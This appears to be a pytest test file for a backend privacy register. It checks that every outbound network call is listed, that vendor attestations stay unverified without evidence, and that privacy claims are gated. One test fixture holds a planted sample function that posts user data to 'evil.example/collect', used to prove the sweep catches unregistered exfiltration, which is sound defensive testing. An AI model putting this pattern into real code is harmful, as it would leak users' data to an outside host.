"""The recipient register is complete, honest about what is unverified, and gates claims (#3065).

The register (:mod:`privacy.recipients`) lists every party outside this process
that receives anything of a user's. These tests hold it to the code rather than
to anyone's memory of the code:

* every dial in ``backend/src`` -- every HTTP client, SDK client, SMTP session,
  JWKS fetch, DNS lookup and error-monitor call -- belongs to exactly one row
  (two named factories excepted), found by sweeping the source rather than
  from a hand-kept list, and a planted dial fails the sweep;
* every field only the owner can attest stays ``UNVERIFIED`` until evidence is
  recorded, and a user-owned (BYOK) account can never carry the operator's
  blanket guarantee;
* the claim gate blocks no-training / no-sale / processor-purpose claims for
  each reason the code can see, and allows one only when nothing is left.
"""

from __future__ import annotations

import ast
import dataclasses
import re
import shutil
import sys
from datetime import date, timedelta
from pathlib import Path
from types import MappingProxyType
from typing import cast

import pytest

import sentry
from privacy.recipients import (
    PROVIDER_BASE_URL_ENV_VARS,
    PROVIDER_RECIPIENTS,
    RECIPIENTS,
    REGISTERED_PROVIDER_BASE_URLS,
    SHARED_FACTORY_SITES,
    UNVERIFIED,
    Block,
    BlockReason,
    ClaimId,
    DataClass,
    DialSite,
    OwnerFields,
    Recipient,
    RecipientId,
    Scope,
    ScopeKind,
    claim_ready,
)
from security.secret_shapes import redact_secret_shapes
from services import botmason, creek_provisioning_client, creek_vault_client, email
from services.botmason import PROVIDER_REGISTRY, LLMProviderError, generate_response
from tests.provider_transport import use_openai
from tests.support.outbound_dials import (
    SRC_ROOT,
    LiteralHost,
    RegisterGaps,
    Sweep,
    egress_leaves,
    register_gaps,
    sweep,
)

TODAY = date(2026, 10, 6)
LIVE_AGREEMENT = TODAY + timedelta(days=30)
EXPIRED_AGREEMENT = date(2026, 1, 1)
UNAPPROVED_MODEL = "gpt-5-new"
UNREGISTERED_PROVIDER = "mistral"

# Every dial site in the tree at this commit. Pinned exactly so a stale register
# (a row claiming a site that moved) fails here with the site named, rather than
# quietly passing because the sweep and the table drifted together.
EXPECTED_SITES = frozenset(
    {
        DialSite("services.botmason", "_call_openai", "openai.AsyncOpenAI"),
        DialSite("services.botmason", "_call_anthropic", "anthropic.AsyncAnthropic"),
        DialSite("services.creek_vault_client", "_build_pooled_vault_client", "httpx.AsyncClient"),
        DialSite(
            "services.creek_vault_pinned_transport",
            "build_pinned_destination_transport",
            "httpx.AsyncHTTPTransport",
        ),
        DialSite("services.creek_vault_url_resolution", "resolve_host_addresses", "*.getaddrinfo"),
        DialSite(
            "services.creek_provisioning_client",
            "get_creek_provisioning_client",
            "httpx.AsyncClient",
        ),
        DialSite("services.email", "SmtpEmailSender._connect", "smtplib.SMTP"),
        DialSite("services.email", "ResendEmailSender.send", "httpx.AsyncClient"),
        DialSite("integrations.gumroad", "verify_license", "httpx.AsyncClient"),
        DialSite("sentry", "init_error_monitoring", "sentry_sdk.init"),
        DialSite("sentry", "capture_exception", "sentry_sdk.capture_exception"),
        DialSite("services.oidc", "build_bounded_jwk_client", "jwt.PyJWKClient"),
    }
)
EXPECTED_HOSTS = frozenset(
    {
        "api.openai.com",
        "api.anthropic.com",
        "api.gumroad.com",
        "api.resend.com",
        "www.googleapis.com",
        "accounts.google.com",
        "appleid.apple.com",
    }
)

# Bounded so a register row can never become a place to paste a document.
MAX_REGISTER_STRING = 200
_HEX_RUN = re.compile(r"[0-9a-f]{32,}", re.IGNORECASE)


@pytest.fixture(scope="module")
def shipped_sweep() -> Sweep:
    """Sweep the real source tree once for the module."""
    return sweep(SRC_ROOT)


# ── Completeness ──────────────────────────────────────────────────────────────


def test_every_outbound_dial_has_exactly_one_register_row(shipped_sweep: Sweep) -> None:
    """No dial, literal host or egress leaf is unregistered, stale or doubly owned."""
    gaps = register_gaps(shipped_sweep, RECIPIENTS, egress_leaves())

    assert gaps == RegisterGaps.empty(), gaps


def test_sweep_finds_exactly_the_known_sites_and_hosts(shipped_sweep: Sweep) -> None:
    """The sweep sees every dial the pattern grep finds, and nothing else."""
    found = sweep(SRC_ROOT)

    assert found.sites == EXPECTED_SITES
    assert {literal.host for literal in found.hosts} == EXPECTED_HOSTS
    assert shipped_sweep == found


def test_the_smtp_relay_is_a_registered_dial() -> None:
    """The password-reset relay is a recipient: the site the minimal sweep missed."""
    claimants = [
        r.id
        for r in RECIPIENTS.values()
        if any(s.constructor == "smtplib.SMTP" for s in r.dial_sites)
    ]

    assert claimants == [RecipientId.SMTP_RELAY]


def test_shared_factory_claimants_are_told_apart_downstream() -> None:
    """A site two rows share is shared only because each claimant has its own distinct way in.

    The JWKS factory is told apart by the literal host each identity provider
    hands it; the pooled vault client by the public factory each vault kind is
    built through.
    """
    found = sweep(SRC_ROOT)
    for site, claimants in SHARED_FACTORY_SITES.items():
        assert len(claimants) > 1, site
        distinguishers = [
            (RECIPIENTS[c].hosts & {h.host for h in found.hosts}) or RECIPIENTS[c].egress_leaves
            for c in claimants
        ]
        assert all(distinguishers), site
        flattened = [item for group in distinguishers for item in group]
        assert len(flattened) == len(set(flattened)), site


def test_endpoint_env_vars_match_source_constants() -> None:
    """Endpoint variables are named in the register and pinned to the code's own constants."""
    assert RECIPIENTS[RecipientId.SENTRY].endpoint_env_vars == (sentry.SENTRY_DSN_ENV_VAR,)
    assert RECIPIENTS[RecipientId.SMTP_RELAY].endpoint_env_vars == (email.SMTP_HOST_ENV_VAR,)
    assert RECIPIENTS[RecipientId.CREEK_PROVISIONING].endpoint_env_vars == (
        creek_provisioning_client.PROVISIONING_URL_ENV_VAR,
    )
    assert RECIPIENTS[RecipientId.CREEK_VAULT_DEPLOYMENT].endpoint_env_vars == (
        creek_vault_client.CREEK_VAULT_URL_ENV_VAR,
    )
    for provider, recipient in PROVIDER_RECIPIENTS.items():
        assert RECIPIENTS[recipient].endpoint_env_vars == (PROVIDER_BASE_URL_ENV_VARS[provider],)


def test_register_models_and_base_urls_match_provider_registry() -> None:
    """The register's approved models and hosts are the dispatch registry's, exactly."""
    assert set(PROVIDER_RECIPIENTS) == set(PROVIDER_REGISTRY)
    assert set(REGISTERED_PROVIDER_BASE_URLS) == set(PROVIDER_REGISTRY)
    assert set(PROVIDER_BASE_URL_ENV_VARS) == set(PROVIDER_REGISTRY)
    for provider, recipient in PROVIDER_RECIPIENTS.items():
        assert RECIPIENTS[recipient].approved_models == PROVIDER_REGISTRY[provider].allowed_models


def test_register_is_read_only() -> None:
    """The table cannot be extended at runtime by whoever imports it."""
    assert isinstance(RECIPIENTS, MappingProxyType)
    assert set(RECIPIENTS) == set(RecipientId)
    assert all(RECIPIENTS[rid].id is rid for rid in RecipientId)


# ── Planted-dial meta-test (playbook rule 2: the gate fails on a real violation) ──

_PLANTED_HTTPX = '''import httpx
EVIL_URL = "https://evil.example/collect"
async def leak(body):
    """See https://docs.example/x for the format."""
    async with httpx.AsyncClient() as client:
        await client.post(EVIL_URL, json=body)
'''

_PLANTED_SMTP_ALIAS = """from smtplib import SMTP as S
def relay():
    S("x")
"""


@pytest.fixture(scope="module")
def copied_src(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """One copy of ``backend/src`` per module, so planting never touches the real tree."""
    root = tmp_path_factory.mktemp("src_copy") / "src"
    shutil.copytree(SRC_ROOT, root, ignore=shutil.ignore_patterns("__pycache__"))
    return root


def _plant(root: Path, name: str, source: str) -> Path:
    planted = root / "planted"
    planted.mkdir(exist_ok=True)
    target = planted / name
    target.write_text(source, encoding="utf-8")
    return target


def test_sweep_names_a_planted_unregistered_dial(copied_src: Path) -> None:
    """Unplanted, the copy is clean; planted, the new dial and its host are named.

    The docstring URL is not a dial and must not be reported: a sweep that
    counted prose would bury the real finding in noise.
    """
    assert register_gaps(sweep(copied_src), RECIPIENTS, egress_leaves()).empty_of_findings()

    target = _plant(copied_src, "evil.py", _PLANTED_HTTPX)
    try:
        gaps = register_gaps(sweep(copied_src), RECIPIENTS, egress_leaves())
    finally:
        target.unlink()

    assert gaps.unclaimed_sites == frozenset(
        {DialSite("planted.evil", "leak", "httpx.AsyncClient")}
    )
    assert gaps.unclaimed_hosts == frozenset({LiteralHost("planted.evil", "evil.example")})
    assert not gaps.empty_of_findings()


def test_sweep_resolves_an_import_alias(copied_src: Path) -> None:
    """``from smtplib import SMTP as S`` is still an SMTP session."""
    target = _plant(copied_src, "alias.py", _PLANTED_SMTP_ALIAS)
    try:
        gaps = register_gaps(sweep(copied_src), RECIPIENTS, egress_leaves())
    finally:
        target.unlink()

    assert gaps.unclaimed_sites == frozenset({DialSite("planted.alias", "relay", "smtplib.SMTP")})


def test_a_duplicate_claim_is_reported() -> None:
    """A site owned by two rows that are not a declared shared factory is a finding."""
    gumroad_site = DialSite("integrations.gumroad", "verify_license", "httpx.AsyncClient")
    resend = RECIPIENTS[RecipientId.RESEND]
    doubled = dict(RECIPIENTS)
    doubled[RecipientId.RESEND] = dataclasses.replace(
        resend, dial_sites=resend.dial_sites | {gumroad_site}
    )

    gaps = register_gaps(sweep(SRC_ROOT), doubled, egress_leaves())

    assert gaps.multiply_claimed == frozenset({gumroad_site})


def test_a_removed_row_leaves_its_dial_unclaimed() -> None:
    """Dropping the SMTP row names the SMTP site -- the table is load-bearing."""
    reduced: dict[RecipientId, Recipient] = {
        rid: r for rid, r in RECIPIENTS.items() if rid is not RecipientId.SMTP_RELAY
    }

    gaps = register_gaps(sweep(SRC_ROOT), reduced, egress_leaves())

    assert gaps.unclaimed_sites == frozenset(
        {DialSite("services.email", "SmtpEmailSender._connect", "smtplib.SMTP")}
    )


# ── Scopes and owner fields ───────────────────────────────────────────────────


def test_byok_scope_is_never_blanket_guarantee_eligible() -> None:
    """Traffic on the user's own vendor account is governed by that account, not ours."""
    for recipient in PROVIDER_RECIPIENTS.values():
        byok = [s for s in RECIPIENTS[recipient].scopes if s.kind is ScopeKind.USER_OWNED_ACCOUNT]
        assert len(byok) == 1
        assert byok[0].blanket_guarantee_eligible is False
        assert DataClass.CONTENT in byok[0].data_classes

    assert "blanket_guarantee_eligible" not in {f.name for f in dataclasses.fields(Scope)}
    assert all(
        not scope.blanket_guarantee_eligible
        for recipient in RECIPIENTS.values()
        for scope in recipient.scopes
        if scope.kind in {ScopeKind.USER_OWNED_ACCOUNT, ScopeKind.TEST_SEAM}
    )


def test_operator_scopes_are_eligible_in_principle() -> None:
    """Eligibility is derived from the kind of account, nothing else."""
    operator = Scope(ScopeKind.OPERATOR_ACCOUNT, frozenset({DataClass.CONTENT}), "t")

    assert operator.blanket_guarantee_eligible is True


def test_owner_fields_default_to_unverified_and_require_evidence() -> None:
    """No row invents an attestation; a filled field without evidence is refused."""
    for recipient in RECIPIENTS.values():
        for scope in recipient.scopes:
            owner = scope.owner
            assert owner.agreement_expires is None
            assert owner.reviewed_at is None
            for name in OwnerFields.ATTESTED_TEXT_FIELDS:
                assert getattr(owner, name) == UNVERIFIED, (recipient.id, name)

    with pytest.raises(ValueError, match="evidence_ref"):
        OwnerFields(training_setting="opted out")
    with pytest.raises(ValueError, match="evidence_ref"):
        OwnerFields(agreement_expires=LIVE_AGREEMENT)


def test_a_recipient_needs_a_name_and_a_scope() -> None:
    """A row nobody can identify, or that describes no traffic, is not a row."""
    base = RECIPIENTS[RecipientId.GUMROAD]
    with pytest.raises(ValueError, match="legal_name"):
        dataclasses.replace(base, legal_name="  ")
    with pytest.raises(ValueError, match="scope"):
        dataclasses.replace(base, scopes=())


def test_content_carrying_rows_are_the_expected_set() -> None:
    """Which recipients ever receive what a user wrote, stated once and pinned."""
    content = {r.id for r in RECIPIENTS.values() if r.carries_content}

    assert content == {
        RecipientId.OPENAI,
        RecipientId.ANTHROPIC,
        RecipientId.CREEK_VAULT_CONNECTED,
        RecipientId.CREEK_VAULT_DEPLOYMENT,
        RecipientId.CREEK_DOWNSTREAM_MODEL,
        RecipientId.HOSTING_PLATFORM,
        RecipientId.FLY,
    }


# ── AC5: an unknown provider or an off-list model never dials ─────────────────


@pytest.mark.asyncio
async def test_unknown_provider_and_off_list_model_never_dial(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Only a registered provider with a register-approved model reaches the network."""
    stub = use_openai(monkeypatch, 200, {})
    monkeypatch.setenv("BOTMASON_PROVIDER", "evilcorp")

    response = await generate_response("hello", [])

    assert response.provider == "stub"
    assert stub.request_count == 0

    monkeypatch.setenv("BOTMASON_PROVIDER", "openai")
    monkeypatch.setenv("LLM_MODEL", "gpt-9-unvetted")
    assert "gpt-9-unvetted" not in RECIPIENTS[RecipientId.OPENAI].approved_models
    with pytest.raises(LLMProviderError):
        await generate_response("hello", [])
    assert stub.request_count == 0
    assert "evilcorp" not in PROVIDER_RECIPIENTS
    assert botmason.get_provider() == "openai"


# ── The claim gate ────────────────────────────────────────────────────────────


def _shipped_models() -> dict[str, frozenset[str]]:
    return {name: spec.allowed_models for name, spec in PROVIDER_REGISTRY.items()}


def _attested(owner: OwnerFields, expires: date = LIVE_AGREEMENT) -> OwnerFields:
    return dataclasses.replace(
        owner,
        purpose="reflection generation only",
        retention="30 days",
        training_setting="opted out",
        agreement_ref="DPA-2026",
        agreement_expires=expires,
        responsible_owner="operator",
        evidence_ref="vendor console receipt",
        reviewed_at=TODAY,
    )


def _fully_attested(expires: date = LIVE_AGREEMENT) -> dict[RecipientId, Recipient]:
    return {
        rid: dataclasses.replace(
            r,
            scopes=tuple(
                dataclasses.replace(s, owner=_attested(s.owner, expires)) for s in r.scopes
            ),
        )
        for rid, r in RECIPIENTS.items()
    }


def _reasons(blocks: tuple[Block, ...]) -> set[BlockReason]:
    return {b.reason for b in blocks}


@pytest.mark.parametrize("claim", list(ClaimId))
def test_shipped_register_blocks_every_claim(claim: ClaimId) -> None:
    """Today nothing is attested, so no claim may be advertised."""
    readiness = claim_ready(
        claim, RECIPIENTS, provider_models=_shipped_models(), today=TODAY, byok_enabled=True
    )

    assert readiness.allowed is False
    assert BlockReason.UNVERIFIED_TRAINING in _reasons(readiness.blocks)
    assert BlockReason.BYOK_SCOPE_IN_USE in _reasons(readiness.blocks)


@pytest.mark.parametrize("claim", list(ClaimId))
def test_claim_allowed_when_fully_attested(claim: ClaimId) -> None:
    """Every field attested, nothing expired, no BYOK: no code-visible blocker remains."""
    readiness = claim_ready(
        claim,
        _fully_attested(),
        provider_models=_shipped_models(),
        today=TODAY,
        byok_enabled=False,
    )

    assert readiness.allowed is True
    assert readiness.blocks == ()


def test_claim_blocked_when_agreement_expired() -> None:
    """An agreement that lapsed yesterday is no agreement."""
    readiness = claim_ready(
        ClaimId.C04,
        _fully_attested(expires=EXPIRED_AGREEMENT),
        provider_models=_shipped_models(),
        today=TODAY,
        byok_enabled=False,
    )

    assert readiness.allowed is False
    assert _reasons(readiness.blocks) == {BlockReason.AGREEMENT_EXPIRED}


def test_claim_blocked_when_model_unapproved() -> None:
    """A model the dispatch registry gained that the register never reviewed blocks."""
    models = _shipped_models()
    models["openai"] = models["openai"] | {UNAPPROVED_MODEL}

    readiness = claim_ready(
        ClaimId.C04,
        _fully_attested(),
        provider_models=models,
        today=TODAY,
        byok_enabled=False,
    )

    assert readiness.blocks == (
        Block(RecipientId.OPENAI, BlockReason.MODEL_NOT_APPROVED, model=UNAPPROVED_MODEL),
    )


@pytest.mark.parametrize("change", ["added", "removed"])
def test_claim_blocked_when_provider_set_changed(change: str) -> None:
    """A provider added to (or dropped from) dispatch without a register review blocks."""
    models = _shipped_models()
    if change == "added":
        models[UNREGISTERED_PROVIDER] = frozenset({"m"})
    else:
        del models["anthropic"]

    readiness = claim_ready(
        ClaimId.C05,
        _fully_attested(),
        provider_models=models,
        today=TODAY,
        byok_enabled=False,
    )

    assert _reasons(readiness.blocks) == {BlockReason.PROVIDER_SET_CHANGED}


def test_claim_blocked_when_byok_in_use() -> None:
    """With BYOK switched on, the operator's guarantee does not cover every call."""
    readiness = claim_ready(
        ClaimId.C06,
        _fully_attested(),
        provider_models=_shipped_models(),
        today=TODAY,
        byok_enabled=True,
    )

    assert readiness.blocks == (Block(None, BlockReason.BYOK_SCOPE_IN_USE),)


def test_processor_purpose_claim_also_needs_non_content_purposes() -> None:
    """C06 is about every processor's purpose, not only the ones that see content."""
    register = _fully_attested()
    sentry_row = register[RecipientId.SENTRY]
    register[RecipientId.SENTRY] = dataclasses.replace(
        sentry_row,
        scopes=tuple(
            dataclasses.replace(s, owner=dataclasses.replace(s.owner, purpose=UNVERIFIED))
            for s in sentry_row.scopes
        ),
    )

    c06 = claim_ready(
        ClaimId.C06, register, provider_models=_shipped_models(), today=TODAY, byok_enabled=False
    )
    c04 = claim_ready(
        ClaimId.C04, register, provider_models=_shipped_models(), today=TODAY, byok_enabled=False
    )

    assert c06.blocks == (Block(RecipientId.SENTRY, BlockReason.UNVERIFIED_PURPOSE),)
    assert c04.allowed is True


def test_unknown_claim_raises() -> None:
    """A claim id the gate does not know is a programming error, not a pass."""
    with pytest.raises(ValueError, match="claim"):
        claim_ready(
            cast("ClaimId", "C99"),
            RECIPIENTS,
            provider_models=_shipped_models(),
            today=TODAY,
            byok_enabled=False,
        )


# ── AC10: no content, keys or hashes ──────────────────────────────────────────


def _strings(value: object) -> list[str]:
    if isinstance(value, str):
        return [value]
    if isinstance(value, (frozenset, set, tuple, list)):
        return [s for item in value for s in _strings(item)]
    if dataclasses.is_dataclass(value) and not isinstance(value, type):
        return [s for f in dataclasses.fields(value) for s in _strings(getattr(value, f.name))]
    return []


def test_register_and_gate_carry_no_content_or_secrets() -> None:
    """Every string the register or the gate can emit is short, plain and secret-free."""
    readiness = [
        claim_ready(
            c, RECIPIENTS, provider_models=_shipped_models(), today=TODAY, byok_enabled=True
        )
        for c in ClaimId
    ]
    strings = _strings(tuple(RECIPIENTS.values())) + _strings(tuple(readiness))

    assert strings
    for text in strings:
        assert redact_secret_shapes(text) == text
        assert not _HEX_RUN.search(text), text
        assert len(text) <= MAX_REGISTER_STRING, text


def test_privacy_package_imports_only_stdlib() -> None:
    """The register is a leaf: importing it can never pull in a client that dials."""
    package = SRC_ROOT / "privacy"
    for path in package.glob("*.py"):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                roots = {alias.name.split(".")[0] for alias in node.names}
            elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
                roots = {node.module.split(".")[0]}
            else:
                continue
            assert roots <= set(sys.stdlib_module_names) | {"privacy", "__future__"}, path
